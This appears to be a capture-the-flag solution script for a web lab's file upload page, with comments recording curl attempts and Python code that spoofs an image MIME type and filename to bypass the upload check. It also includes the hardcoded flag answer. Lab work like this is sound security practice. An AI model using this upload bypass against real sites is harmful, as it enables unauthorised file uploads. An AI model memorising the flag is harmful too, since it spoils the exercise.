# Went to the "File Upload" page
# Did: touch hei.txt
# Uploaded it using: curl --form "Upload=send" --form "uploaded=@hei.txt" http://10.100.52.65:20930/\?page\=upload
# Got the error: "Your image was not uploaded."
# Changed the type: curl --form "Upload=send" --form "uploaded=@hei.txt;type=image/jpeg" http://10.100.52.65:20930/\?page\=upload
# Got the message: "Nice try but should be the image name extracted from SEARCH IMAGE attack"

import re

import requests
from constants import FLAG_REGEX, SUPPORT, TIMEOUT
from flag_11 import PICTURE_FILENAME


FLAG12 = "bac24ceae6b5b37aeeb79029014d29da"

FILE_PATH = SUPPORT / "injected.txt"


def main() -> None:
    with FILE_PATH.open("rb") as file:
        response = requests.post(
            "http://10.100.52.65:20930/?page=upload",
            files={"uploaded": (PICTURE_FILENAME, file, "image/jpeg")},
            data={"Upload": "send"},
            timeout=TIMEOUT,
        )

    if (match := re.search(FLAG_REGEX, response.text)) is None:
        raise ValueError()

    flag = match.group(1)
    print(flag)


if __name__ == "__main__":
    main()
